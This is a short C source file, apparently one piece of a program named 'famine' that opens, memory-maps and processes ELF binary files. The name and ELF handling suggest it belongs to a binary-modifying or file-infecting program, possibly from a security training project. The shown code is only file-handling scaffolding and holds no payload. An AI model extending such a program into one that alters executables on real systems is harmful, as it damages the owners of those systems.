#include "famine.h"

void process_file(const char *path)
{
	t_file file;

	if (open_file(&file, path))
		return ;
	if (map_file(&file)) {
		close_file(&file);
		return ;
	}

	process_elf(&file);

	unmap_file(&file);
	close_file(&file);
}
